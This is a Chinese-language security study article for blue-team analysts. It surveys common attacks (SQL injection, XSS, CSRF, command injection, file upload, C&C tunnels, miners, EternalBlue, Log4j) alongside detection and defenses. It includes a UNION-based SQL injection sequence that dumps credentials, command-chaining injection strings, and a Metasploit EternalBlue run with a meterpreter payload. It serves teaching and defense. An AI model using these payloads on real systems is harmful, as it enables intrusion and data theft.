#  攻防演练事件研判篇（HW本文足够中高级）

江霁月  [ Hacking黑白红 ](javascript:void\(0\);)

**Hacking黑白红** ![]()

微信号 Hacking012

功能介绍 知黑、守白、弘红；白帽、大厂、安防、十年、一线、老兵。【分享】个人渗透实战、编程、CTF、挖SRC、红蓝攻防、逆向，代码审计之经历、经验。

____

___发表于_

收录于合集

## 攻防演练、渗透测试这一篇文章足够，学完蓝队直接中高级。

## 本文字数：20380个字｜预计分51钟读完

## 建议先收藏

## 目录

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    分析研判技术  网络安全攻击类型  网络安全攻击危害   研判方法  防护方法暴力攻击&DDos攻击  暴力破解的攻击方法  暴力破解的危害及防御  DDos攻击的攻击方法  DDos攻击症状迹象  DDos攻击的防护措施XSS跨站脚本攻击  XSS攻击的原理  XSS攻击的种类  XSS攻击的攻击流程  XSS攻击的危害及防御SQL注入攻击  SQL注入的原理  SQL注入的种类  SQL注入的攻击流程  SQL注入的危害及防御文件上传  文件上传的原理  文件上传的绕过方式  文件上传的攻击流程  文件上传的危害及防御CSRF跨站请求伪造  CSRF的原理  CSRF的攻击方法  CSRF的攻击流程  CSRF的危害及防御命令执行  命令执行的原理  命令执行的攻击流程  命令执行的危害及防御恶意通信  恶意通信介绍  隐蔽隧道通信  C&C通信挖矿病毒  什么是计算机病毒  挖矿病毒介绍  挖矿病毒应急响应永恒之蓝(MS17-010)  永恒之蓝漏洞简介  永恒之蓝漏洞攻击利用  永恒之蓝危害及防御Log4j2远程代码(RCE)执行  Log4j2漏洞原理介绍  前置知识  Log4j2远程代码执行漏洞复现及漏洞修复权限提升  权限提升介绍  Windows系统提权  Linux系统提权

##  

## 分析研判技术

### 网络安全攻击类型

  * 暴力破解

  * xss跨站脚本攻击

  * 目录遍历

  * 恶意通信

  * 永恒之蓝勒索病毒

  * 权限提升

  * SQL注入

  * 文件上传漏洞

  * 命令注入

  * 挖矿病毒

  * Log4j远程代码执行

### 网络安全攻击危害

  1. 经济损失和业务损失,黑客的攻击会导致受害者业务中断、数据泄露;严重时,可以让一家公司的年利润化成了泡影;若攻击政企单位,将会造成办理日常业务受阻和政企单位自身系统收到损害,影响正常社会运转

  2. 人身安全.云时代,甚至未来的IOT时代,安全将影响每个人的生命安全.例如:黑客利用漏洞查看病人信息,入侵医疗系统设备.无人驾驶汽车和机场的航线监控系统.每漏掉一次及其危险的威胁,在未来都有可能影响到人身安全和社会安全

  3. 对整个互联网环境的破坏,将服务器变成"肉鸡",使其攻击其他主机,如果服务器上有重要的数据:信用卡、个人隐私,就会流入到黑产行业中,会让整个互联网环境日益恶化.

### 研判方法

  1. 导出最近七天的日志,日志条件:源地址,目的地址,事件名称,时间,规则ID,发生次数等

  2. 根据动作、地址、事件名称、时间等信息进行研判

### 防护方法

#### 发生攻击前

  1. 渗透测试

  2. 漏洞扫描

#### 发生攻击后

  1. 应急响应

  2. 安全加固

## 暴力攻击&DDos攻击

### 暴力破解的攻击方法

>
> 暴力破解的产生原因是因为服务器端没有做限制，导致攻击者可以通过暴力破解的手段破解用户所需要的信息，如用户名、密码、验证码等。暴力破解需要有庞大的字典，暴力破解的关键在于字典的大小。不仅仅是密码破解。暴力破解还可用于发现Web应用程序中的隐藏页面和内容。
>
> 基本原理就是使用字典中的内容进行一一尝试，如果匹配成功了，提示该用户名密码正确，如果匹配失败，那么会继续进行尝试;

#### 暴力破解

  1. 传统的暴力攻击中，攻击者只是尝试字母和数字的组合来顺序生成密码；消耗时间长，取决于系统和密码的长度。

  2. 为了发现隐藏页面，攻击者会尝试猜测页面名称，发送请求并查看响应。如果该页面不存在，它将显示响应404，成功的话就会响应200。这样，它可以在任何网站上找到隐藏页面。

  3. 用于破解散列并从给定散列中猜出密码。这样的话，哈希是从随机密码生成的，然后此哈希与目标哈希匹配，直到攻击者找到正确的哈希。

  4. 穷举法:根据输入密码的设定长度,选定的字符集生成可能的密码全集

  5. 字典攻击法:将出现频率最高的密码保存到文件中,这个文件就叫字典

  6. 彩虹表攻击:也属于字典攻击法的一种,核心思想为:将明文计算得到的HASH由函数映射回明文空间,交替计算明文和HASH,生成哈希链

#### 逆向暴力破解

破解密码采用相反的方法,攻击者针对多个用户名尝试一个密码,直到找到匹配组合

### 暴力破解的危害及防御

#### 危害

  1. 密码被盗取,针对个人信息与政企系统信息被泄露

  2. 服务器性能收到影响甚至被控制,设备瘫痪,服务器死机,例如:ssh暴力破解

#### 防护

  1. 设计安全的验证码(安全的流程+复杂可用的图形)

  2. 认证错误对提交次数给予限制,比如错误三次三小时内不可登录

  3. 双因素认证

  4. 员工和个人的安全意识,系统做好定期修复漏洞,员工意识到位,让不发分子没有可乘之机

### DDos攻击的攻击方法

> 分布式拒绝服务(Distributed Denial of
> Service)攻击是一种恶意企图，通过大量互联网流量压倒目标或其周围的基础架构来破坏目标服务器，服务或网络的正常流量。DDoS攻击通过利用多个受损计算机系统作为攻击流量来源来实现有效性。被利用的机器可以包括计算机和其他网络资源，例如物联网设备。从高层次来看，DDoS攻击就像堵塞高速公路的交通堵塞，阻止了常规交通到达其所需的目的地。

  1. 应用程序层攻击(OSI第七层攻击)

    1. HTTP洪水攻击:类似于同时在大量不同计算机的web浏览器中一次次按下刷新键,大量的http请求涌向服务器

  2. 协议攻击

    1. 协议攻击又称状态耗尽攻击,这类攻击会过度消耗服务器资源和负载均衡器之类的网络设备资源

  3. 容量耗尽攻击

    1. 试图通过消耗目标与较大的互联网之间的所有可用带宽带来造成拥塞,攻击运用某种方法攻击或其他生成大量流量的手段

### DDos攻击症状迹象

  1. 最明显的症状就是网站或者服务突然变慢或者不可用

  2. 对于单个也没或者端点的请求数量出现不明原因的激增

  3. 奇怪的流量模式:夜里出现不自然的访问,或者有规律的访问(每10分钟激增一次)

### DDos攻击的防护措施

#### 危害

  1. 业务受损,服务器因DDos攻击造成无法访问,会导致客流量的严重流失,进而对整个平台和企业的业务造成严重影响

  2. 形象受损,服务器无法访问会导致用户体验下降、用户投诉增多等问题.

  3. 当网站被打到快瘫痪时,维护人员的全部精力都在抗DDos上面,攻击者窃取数据、感染病毒、恶意欺骗等犯罪活动更容易得手

#### 防护

  1. 高仿IP,通过把域名解析到高仿IP上,并配置源站IP.所有公网流量都经过高仿IP机房,通过端口协议转发的方式将访问流量通过高仿IP转发到源站IP,同时将恶意攻击流量在高仿IP上进行清洗过滤后,将正常流量返回给源站IP,从而确保源站IP稳定访问

  2. 软件防火墙:在服务器上使用软件防火墙,或者通过设置相关脚本,过滤掉这些异常流量.企业可以使用简单的命令和专用服务器的软件防火墙,来获取攻击者的IP地址、与服务器的连接数,将其屏蔽.

  3. 黑洞路由

  4. 速率限制

  5. WEB应用程序防火墙

  6. anycast网络扩散

## XSS跨站脚本攻击

### XSS攻击的原理

> 跨站脚本在英文中称为Cross--Site Scripting,缩写为CSS。但是由于层叠样式表(Cascading Style
> Sheets)的缩写也为CSS,
>
> 为不与其混淆，特将跨站脚本缩写为XSS,指恶意攻击者利用网站漏洞往Wb页面里插入恶意代码，从而在用户浏览网页的时候，控制用户
>
> 浏览器的一种攻击。一般需要满足以下条件：
>
>   1. 客户端访问的网站是一个有漏洞的网站，但是他没有意识到
>
>   2. 在这个网站中通过一些手段放入一段可以执行的代码，吸引客户执行
>
>   3. 客户点击后，代码执行，可以达到攻击目的。
>
>

### XSS攻击的种类

#### 存储型XSS

>
> 嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库，等用户在打开页面时，会继续执行恶意代码，能够持续的攻击用户.(危害最大)

#### 反射型XSS

>
> 发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS.

#### DOM型XSS

>
> 通过JavaScript,可以重构整个HTML文档，就是说可以添加，移除等等，对页面的某个东西进行操作时，JavaScript就需要获得对HTML文档中所有元素进行访问的入口。这个入口就是DOM,所以在DOM型的XSS漏洞利用中，DOM可以看成是一个访问HTML的标准程序接口。（全程前端，没有后端参与）

### XSS攻击的攻击流程

  1. 攻击者寻找具有漏洞的网站

  2. 攻击者给用户发了一个带有恶意字符串的链接

  3. 用户点击了该链接

  4. 服务器返回HTML文档,但是该文档此时不包含那个恶意字符串

  5. 客户端执行了该HTML文档里的脚本,然后把恶意脚本植入了页面

  6. 客户端执行了植入的恶意脚本,XSS攻击就发生了

### XSS攻击的危害及防御

#### 危害

  1. cookie劫持:通过XSS漏洞,我们可以轻易的将JavaScript代码注入被攻击用户的页面并用浏览器执行

  2. CSRF:使用XSS可以实现CSRF,不过XSS只是实现CSRF的诸多途径中的一条

    1. 例如:用户的Cookie设置了httponly,无法轻易获取cookie的内容.但是由于我们可以控制用户的页面脚本(XSS),我们可以利用脚本向后台发送命令,此时浏览器会给请求带上被攻击的Cookie.如:`$.put('/tranferMoney?from=account&to=account&mount=10000')`

  3. XSS钓鱼:这里需要结合`<iframe>`点击劫持

    1. 直接在当前页面动态模拟创建登录窗口

    2. `location.href="jiangjiyue.github.io"`重写当前内容设置假的url

  4. 获取用户信息,例如:蜜罐反制

  5. XSS蠕虫

#### 防护

  1. 基于特征的防御:传统的XSS防御在进行攻击鉴别时多采用特征匹配方式,主要是针对JavaScript这个关键词进行检索

  2. 基于代码修改的防御:

    1. Web页面开发者在编写程序时往往会出现一些失误或漏洞,Xss攻击正是利用了失误和漏洞,因此一种比较理想的方法就是通过优化Web应用开发来减少漏洞,避免被攻击

    2. 用户向服务器上提交信息时要对URL和附带的HTTP头,POST数据进行查询,对于不是规定格式,长度内容进行过滤

    3. 实现Session标记,captcha系统或者HTTP引用头检查,防止被第三方网站利用

    4. 确认接受的内容被妥善的规范化,仅包含最小的、安全的tag、去掉任何对远程内容的引用,使用httponly的cookie

  3. 客户端分层防御策略

    1. 对于每一个网页分配独立线程且分析资源消耗的网页线程分析模块

    2. 包含分层防御策略四个规则的用户输入分析的模块

    3. 保存互联网的XSS恶意网站信息的XSS payload数据库

## SQL注入攻击

### SQL注入的原理

> SQL注入即是指wb应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在wb应用程序中事先定义好的查询语句的结  
> 尾上添加额外的$QL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

### SQL注入的种类

  1. 数值型注入:前台页面输入的参数是数字,字段类型是数值

  2. 字符型注入:前台页面输入的参数是字符串,字段类型是字符

    1. 单引号字符注入:`select * from user where username='zhangsan'`

    2. 双引号字符注入:`select * from user where username="zhangsan"`

    3. 括号字符注入:`select * from user where id =(1)`

  3. 盲注:在无法构造回显位置时使用

  4. 其他类型注入:例如get注入,post注入,cookie注入,http header注入等

    1. get注入:以get的方式进行提交，注入点一般在get提交的url后面，可以用bp抓包进行查找

    2. post注入:以post的方式进行提交，注入点一般在表单的填写处，资料的填写处，也可以用bp抓包的进行查找。

    3. http头部注入:user-agent判定用户的操作系统;cookie:用户的身份识别,跟踪可以存储在用户本地的数据,clientip:保存客户端ip的参数

### SQL注入的攻击流程

  1. 判断注入类型(数字型or字符型)

  2. 猜解SQL查询语句中的字段数:`1' or 1=1 order by 10 --+`

  3. 确定字段的显示顺序:`1' union select 1,2 --+`

  4. 获取当前数据库:`1' union select 1,database() --+`

  5. 获取数据库中的表:`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+`

  6. 获取表中的字段名:`1' union select 1,group_concat(cloumn_name) from information_schema.columns where table_name='users' --+`

  7. 下载数据:`1' union select 1,group_concat(id,username,password) from users --+`

### SQL注入的危害及防御

#### 危害

  1. 盗取用户数据和隐私，这些数据被打包贩卖，或用于非法目的后，轻则损害企业品牌形象，重则将面临法律法规风险。

  2. 攻击者可对目标数据库进行“增删改查”，一旦攻击者删库，企业整个业务将陷于瘫痪，极难恢复。

  3. 攻击者添加管理员帐号。即便漏洞被修复，如果企业未及时察觉账号被添加，则攻击者可通过管理员帐号，进入网站后  
台。

  4. 植入网页木马程序，对网页进行篡改，发布一些违法犯罪信息

#### 防护

  1. 提高开发人员的安全意识

  2. 通过各种技术手段防御

  3. 使用云服务提供商的安全产品

  4. 保存互联网的XSS恶意网站信息的XSS payload数据库

## 文件上传

### 文件上传的原理

> 网站Wb应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文  
>
> 件类型，此时攻击者就可以上传一个webshell到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。还有一部分是攻击者通过Wb服务器的解析漏洞来突破Web应用程序的防护。

### 文件上传的绕过方式

  1. JavaScript检查:Bp在文件上传时进行截断改文件后缀名

  2. 服务端检测:MIME类型的检查、文件扩展名检查、目录路径的检查、检测文件内容是否包含恶意代码等方法

### 文件上传的攻击流程

![](https://gitee.com/fuli009/images/raw/master/public/20230217134859.png)

### 文件上传的危害及防御

#### 危害

  1. 上传文件是病毒或木马时,主要用于诱骗用户或者管理员下载执行或者直接运行

  2. 上传文件是Flash的策略文件`crossdomain.xml`时,黑客用于控制Flash在该域下的行为

  3. 上传文件是钓鱼图片或者包含了脚本的图片,在某些版本的浏览器中会被作为脚本执行,被用于钓鱼和欺诈

#### 防护

  1. 文件上传的目录设置为不可执行

  2. 判断文件类型:结合使用MIME Type、后缀检查等方式,对于图片的处理,可以使用压缩函数或者resize函数(破坏图片中可能包含的HTML代码)

  3. 使用随机数改写文件名和文件路径

  4. 单独设置文件服务器的域名

  5. 限制上传文件大小

  6. 确保上传文件被访问返回正确,(禁止过多返回路径等其他敏感信息)

## CSRF跨站请求伪造

### CSRF的原理

> CSRF(Cross-site request forgery,中文名称：跨站请求伪造，也被称为:one click attack/session
> riding,缩写为:CSRF/XSRF  
> 攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括:以你名义发送邮件，发消息，盗取你的账号，甚至于购  
> 买商品，虚拟货币转账.....造成的问题包括:个人隐私泄露以及财产安全

### CSRF的攻击方法

#### 自动发起Get请求

将恶意的请求接口隐藏在img标签内,欺骗浏览器这是一张图片资源,当该页面被加载时,浏览器会自动发起img的资源请求,如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个恶意请求

#### 自动发起POST请求

黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是系统的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨站点POST数据提交。

#### 引诱用户点击链接

通常出现在论坛或者恶意邮件上.黑客会采用很多方式去诱惑用户点击链接

### CSRF的攻击流程

![](https://gitee.com/fuli009/images/raw/master/public/20230217134900.png)

  1. 攻击者发现CSRF漏洞

  2. 构造代码

  3. 发送给受害人

  4. 受害人打开

  5. 受害人执行代码

  6. 完成攻击

### CSRF的危害及防御

#### 危害

  1. 网络连接：利用防火墙内用户的浏览器间接的对他所想访问的资源发送网络请求。

  2. 获知浏览器的状态；当浏览器发送清求时，通常情况下，网络协议里包含了浏览器的状态。

  3. 改变浏览器的状态。当攻击者借助浏览器发起一个请求的时候，浏览器也会分析并相应服务端的response;

#### 防护

  1. 验证token值:在请求中放入黑客所不能伪造的信息，这个信息就是以参数的形式随机生成的token(在http请求头里)，在服务器端加入拦截器去验证token,如果token不正确或者不存在，可以认定是一个csrf的请求并且拒绝

  2. 验证HTTP头的Referer

  3. 用XMLHttpRequest附加在header里

  4. 只使用JSON API

## 命令执行

### 命令执行的原理

> 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码中调用代码或命令执行函数去处理。
>
> 比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。
>
> 定义：用户提交的数据被服务器处理擎当做系统命令语句片段执行。

### 命令执行的攻击流程

常见位置:参数值、Cookie值、X-Forwarded-For、Referer、User-Agent、Host理论上,注入点存在与HTTP请求的任何位置

#### 多命令执行

    
    
    windows:"|","||","&”,“&&”  
    例:  
    ping 127.0.0.1|whoami  直接执行后面的语句  
    ping 127.0.0.1||whoami 前面语句执行出错  执行后语句  
    ping 127.0.0.1&whoami  都执行  
    ping 127.0.0.1&&whoami 前为假不执行  
      
    Liunx:";","&","&&”,“|”,“||”,"$()",'XX'  
    例:id;ls  
    whoami & touch a  
    whoami $ (touch a)  
    whoami `touch a`  
    

### 命令执行的危害及防御

#### 危害

  1. 可以直接控制服务器

  2. 可以通过提权控制服务器

#### 防护

  1. 尽量不要使用系统执行命令

  2. 使用硬编码:将参数固定,避免直接读取用户提交数据

  3. 命令确实需要动态调整,可将内容固定为一个选择列表

  4. 在进入执行命令函数之前,变量一定要做好过滤,对敏感字符进行过滤或者转义

  5. 不能完全控制的危险函数应当被禁止

## 恶意通信

### 恶意通信介绍

> 定义：主机访问恶意IP或恶意域名、主机与通信端存在恶意通信流量。
>
> 常见的恶意IP地址是僵尸网络中被控制的主机地址，其次是受恶意程序攻陷的IP地址。
>
> 恶意域名惯用的手段是诱导用户访问不安全的网址，这类网址通常被植入木马、病毒程序等恶意代码，在用户不知情的情况下，利用伪装的网站服务内容诱导用户访问。

### 隐蔽隧道通信

#### Socks隧道

>   1. socks是一种代理服务，可以说是一个升级版的Icx(内网端口转发工具).
>
>   2. Socks有socks4和socks5两种类型，socks4只支持TCP协议，而socks5支持TCP/UDP协议。
>
>   3. 通过在靶机上配置Socks服务，让恶意主机通过Socks客户端连接Socks服务，进而实现跳板攻击。
>
>   4.
> socks协议中有交互协议，当访问某个网站的时候，浏览器会把被访问目标的URL和服务端口交给socks服务端进行解析，socks服务端解析后代替浏览器去访问目标网站,将结果返回给浏览器。
>
>   5. 端口转发必须要知道访问端口，并只能一对一；而socks支持一对多
>
>

>
> 注：SOCKS是"Sockets"的缩写。

#### Socks5

> Socks5 是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。  
> Socks5工作在比HTTP代理更低的层次。  
>
> Socks5是一个代理协议，它在使用TCP/IP协议通讯的前端机器和服务器机器之间扮演一个中介角色，使得内部网中的前端机器变得能够访问Internet网中的服务器，或者使通讯更加安全。Socks5服务器通过将前端发来的请求转发给真正的目标服务器，模拟了一个前端的行为。在这里，前端和Socks5之间也是通过TCP/IP协议进行通讯，前端将原本要发送给真正服务器的请求发送给Socks5服务器，然后Socks5服务器将请求转发给真正的服务器。

#### ICMP隧道

>   1. ICMP协议  
> ICMP(Internet Control Message Protocol))
> Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。
>
>   2. ICMP隧道原理
>
>     1. 由于ICMP报文自身可以携带数据，而且ICMP报文是由系统内核处理的，不占用任何端口，因此具有很高的隐蔽性。
>
>     2.
> 通常ICMP隧道技术采用ICMP的`ICMP_ECHO`和`ICMP_ECHOREPLY`两种报文，把数据隐藏在ICMP数据包包头的选项域中，利用ping命令建立隐蔽通道。
>
>     3.
> 进行隐蔽传输的时候，肉鸡（防墙内部）运行并接受外部攻击端的`ICMP_ECHO`数据包，攻击端把需要执行的命令隐藏在`ICMP_ECHO`数据包中，肉鸡接收到该数据包，解出其中隐藏的命令，并在防火墙内部主机上执行，再把执行结果隐藏在`ICMP_ECHOREPLY`数据包中，发送给外部攻击端。
>
>   3. ICMP隧道优缺点
>
>     1. ICMP隐蔽传输是无连接的,传输不是很稳定,而且隐蔽通道的带宽很低
>
>     2. 利用隧道传输时,需要接触更低层次的协议,这就需要高级用户权限
>
>     3. 防火墙对`ICMP_ECHO`数据包是放行的,并且内部主机不会检查ICMP数据包所携带的数据内容,隐蔽性高
>
>     4. 优点
>
>     5. 缺点
>
>

![](https://gitee.com/fuli009/images/raw/master/public/20230217134901.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230217134902.png)

### C&C通信

> C&C的全称是Command and
> Control,即命令及控制。攻击者可以利用C&C技术.盗取受害主机上的机密数据，也可以操控大量的C&C客户端发动DDoS攻击。有时，攻击者也会将C&C作为APT攻击的一个环节，为进一步实施攻击做准备。

#### 危害

大多数网络边界防护手段比较有效，这使得攻击者很难从外部直接联系目标主机。然而，对于从内部发起的网络连接，往往却没有进行严格的限制，这就给了攻击者可乘之机。C&C通信过程针对这个“漏洞”进行了设计。当受害主机已经被植入恶意程序，通常该程序会建立一个出方向的连接，攻击者成功接触到内网主机后即可进行如下几种类型的操作：

  1. 横向移动

  2. 机密数据盗取

  3. DDoS攻击

  4. APT攻击

#### 通信方式

> C&C通信过程中包含两个重要角色：
>
> C&C服务器:由黑客控制的主机，
>
> C&C客户端:被植入恶意程序的受害主机。
>
>
> C&C服务器不仅可以收集C&C客户端的信息，如操作系统、应用软件和开放端口等，还可以向C&C客户端发送控制指令，指使它执行某些恶意行为。攻击者也可以将C&C客户端作为跳板，通过其感染更多网络内的主机，扩大C&C客户端的规模。
>
> C&C服务器的全称是Command and Control Server,:即“命令及控制服务器”。

常见的C&C通信方式:

  1. 通过IP地址访问C&C服务器

  2. 通过域名访问C&C服务器

  3. Fast-flux

  4. 使用网站或论坛作为C&C服务器

  5. 使用DGA生成随机域名

## 挖矿病毒

### 什么是计算机病毒

> 计算机病毒(Computer
> Virus)：指编制者在计算机程序中插入的破坏计算机功能或者破坏数据，影响计算机正常使用并且能够自我复制的一组计算机指令或程序代码。
>
> 特征：隐蔽性、破坏性、破坏性、寄生性、可执行性、可触发性、攻击的主动性、针对性
>
> 中毒电脑的主要症状很多，凡是电脑不正常都有可能与病毒有关。电脑染上病毒后，如果没有发作，是很难觉察到的。
>
>
> 但病毒发作时就很容易从以下症状中感觉出来：工作会很不正常；莫名其妙的死机；突然重新启动或无法启动；程序不能运行；磁盘坏簇莫名其妙地增多；磁盘空间变小；系统启动变慢；数据和程序丢失；出现异常的声音、音乐或出现一些无意义的画面问候语等显示；正常的外设使用异常，如打印出现问题，键盘输入的字符与屏幕显示不一致等；异常要求用户输入口令。

### 挖矿病毒介绍

>
> 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue)、web攻击多种漏洞（如Tomcat:弱口令攻击、Veblogic
> WLS组件漏洞、Jboss,反序列化漏洞、Struts2远程命令执行等)，导致大量服务器被感染挖矿程序的现象。

特点:

  1. 具有多样性的传播方式

  2. 隐蔽谋利的危害行为

  3. 勤于更新的特点

危害:

  1. 占用计算机资源

  2. 会被作为病毒渠道植入其他病毒

  3. 系统会被锁死、破坏

  4. 内网产生大规模DDos流量导致网络瘫痪

### 挖矿病毒应急响应

挖矿病毒检查工具:

  1. Process Hacker:是一款功能丰富的系统进程管理工具。用户只要借助该程序就可以方便，快捷地查看相关进程的速度，内存，及模块等等，另外，还可以对相关的进程进行管理工作。

  2. processexplorer：由Sysinternals开发的Windows系统和应用程序监视工具，已并入微软旗下。不仅结合了Filemon(文件监视器)和Regmon(注册表监视器)两个工具的功能，还增加了多项重要的增强功能

  3. pchunter:PC Hunter是一个Windows系统信息查看软件，同时也是一个手工杀毒辅助软件

  4. 火绒剑

#### Windows

  1. 事件发现

    1. 程序启动很慢,打开任务管理器发现cpu被占用接近100%,服务器资源占用严重

  2. 事件分析

    1. 查看windows任务管理器,发现多个异常进程

    2. 分析进程参数:`wmic process get caption,commandline /value >>tmp.txt`

    
    
    # 使用下面的命令  
    wmic process get caption,commandline /value  
    # 如果想查询某一个进程的命令行参数,使用下列方式  
    wmic process where caption="svchost.exe" get caption,commandline /value  
    # 这样就可以得到进程的可执行文件位置等信息  
    

  3. 对挖矿病毒脚本分析

  4. 清除挖矿病毒

    1. 关闭异常进程

    2. 删除挖矿程序

#### Linux

  1. 事件发现

    1. 安全平台提示主机进行挖矿登录,持续访问矿池地址,进入主机使用top命令查看进程CPU占用率高

  2. 事件处理

    1. 枚举定时任务:`crontab -l`

    2. 查看anacron异步定时任务:`cat /etc/anacrontab`

    3. 通过`ps -auxef`和`netstat -tulnp`两个命令查看异常进程信息

    4. 结束病毒进程`ps -elf |grep [pid] kill -9 [pid]`

    5. 删除病毒文件`ls -al /proc/[pid]/exe rm -f [exe_path]`

    6. 检查是否存在可疑定时任务

注意:为了避免系统命令被替换,预加载动态库等问题,下载静态链接版本的busybox来进行调查.或者下载源码编译busybox源码,注意编译的时候采用静态链接编译

## 永恒之蓝(MS17-010)

### 永恒之蓝漏洞简介

> 永恒之蓝是指2017年4月14日晚，黑客团体Shadow
> Brokers(影子经纪人)公布一大批网络攻击工具，其中包含"永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限
>
>
> 永恒之蓝通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

### 永恒之蓝漏洞攻击利用

    
    
    # 使用msf  
    search ms17_010  
    use 0  
    # 设置Payload为bind_tcp,经过测试,此台机器不允许出网,只能正向连接  
    set payload windows/x64/meterpreter/bind_tcp  
    # 设置IP地址  
    set RHOSTS 10.10.2.11  
    # 运行  
    run  
    

### 永恒之蓝危害及防御

#### 危害

  * 可以控制服务器,进行主机提权、获取敏感信息、实施跳板攻击等操作

#### 防御

  * 在线更新:开启Windows Update更新

  * 打补丁:此漏洞对应的微软补丁地址:https://learn.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010

  * 关闭相应端口

## Log4j2远程代码(RCE)执行

### Log4j2漏洞原理介绍

> Apache
> Log4j2是一款优秀的ava日志框架，Log4j2作为日志记录的第三方库，被广泛得到使用。可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。
>
>
> 因为存在前身Log4j,而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似，导致有些人分不清自己用的是Log4j还是Log4j2。这里给出几个辨别方法：
>
>   1.
> Log4j2分为2个jar包，一个是接口log4j-api-{版本号}为ar,一个是具体实现log4j-core-{版本号}jar。Log4j只有一个jar包log4j-{版本号为jar。
>
>   2. Log4j2的版本号目前均为2.x.Log4j的版本号均为1.x。
>
>

#### 漏洞(CVE-2021-44228)产生原因

Log4j2默认提供了Lookup功能，查找提供了一种在任意位置向Log4j配置添加值的方法。它们是实现StrLookup接口的特定类型的插件。其中包括了对JNDI
Lookup的支持，但是却未对传入内容进行任何限制，导致攻击者可以JNDI注入，远程加载恶意类到应用中，从而RCE。

### 前置知识

#### JNDI(Naming and Directory Interface)

> Java命名和目录接口,既然是接口,那必定就有实现,而目前我们Java中使用最多的基本就是RMI和LDAP的目录服务系统.
>
>
> 而命名的意思就是，在一个目录系统，它实现了把一个服务名称和对象或命名引用相关联，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。而目录的意思就是在命名的基础上，增加了属性的概念，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录。而JNDI中的目录服务中的属性大概也与之相似，因此，我们就能在使用服务名称以外，通过一些关联属性查找到对应的对象
>
> 总结的来说：JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。

![](https://gitee.com/fuli009/images/raw/master/public/20230217134903.png)  
还是前面所说的例子,我们在使用浏览器进行访问一个网络上的接口时,它和服务器之间的数据传输以及数据格式的组织,使用到基于TCP/IP之上的HTTP协议,只有通过HTTP协议,浏览器和服务端约定好的一个协议,他们之间才能正常的交流通讯,而JRMP也是一个与之相似的协议,只能JRMP这个协议仅用于Java
RMI中

#### RMI(Remote Method Invocation)

>
> 能够让程序员开发出基于Java的分布式应用.一个RMI对象是一个远程Java对象,可以从另一个Java虚拟机上(甚至跨过网络)调用他的方法,可以像调用本地Java对象的方法一样调用远程对象的方法,使分布在不同的JVM中的对象的外表和行为都像本地对象一样
>
> 一台机器想要执行另一台机器上的java代码
>
> 例如:
>  
>  
>     我们使用浏览器对一个http协议实现的接口进行调用,这个接口调用过程我们可以称为`Interface
> Invocation`,而RMI的概念与之非常相似,只不过RMI调用的是一个Java方法,而浏览器调用的是一个http接口.并且Java中封装了RMI的一系列定义  
>     >

![](https://gitee.com/fuli009/images/raw/master/public/20230217134904.png)  
Server--->告诉注册中心Client--->根据名字和注册中心要端口

> Registry翻译一下就是注册处,其实本质就是一个map(hashtable),注册着许多Name到对象的绑定关系,用于客户端查询要调用的方法的引用.
>
> 注册中心约定端口:1099
>
> Registry的作用就好像是病人(客户端)看病之前的挂号(获取远程对象的IP、端口、标识符),知道医生(服务端)在哪个门诊,再去看病(执行远程方法)

RMI底层通讯采用了Stub(运行在客户端)和Skeleton(运行在服务端)机制,RMI调用远程的方法大致如下:整个过程会进行两次TCP连接:

  1. Client获取这个Name和对象的绑定关系

    * RMI客户端在调用远程方法时会先创建`Stub(sun.rmi.registry.Registrylmpl Stub)`

    * Stub会将Remote对象传递给远程引用层`java.rmi.server.RemoteRef`并创建`java.rmi.server.RemoteCall`(远程调用)对象。

    * RemoteCall序列化RMI服务名称、Remote对象。

